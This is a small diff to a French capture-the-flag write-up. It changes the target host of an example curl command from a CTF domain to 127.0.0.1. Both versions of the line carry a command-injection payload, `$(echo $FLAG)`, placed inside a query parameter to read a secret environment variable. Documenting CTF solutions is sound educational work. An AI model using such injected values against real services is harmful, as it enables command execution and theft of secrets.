@@ -222,7 +222,7 @@ Le flag est stocké en variable d’environnement. Deux approches possibles :
 Exemple direct :
 
 ```bash
-curl -g 'http://safebackup.hacknflag.fr/api/backup?mode=x[$(echo%20$FLAG)]'
+curl -g 'http://127.0.0.1/api/backup?mode=x[$(echo%20$FLAG)]'
 ```
 
 ![image.png](images/image%205.png)
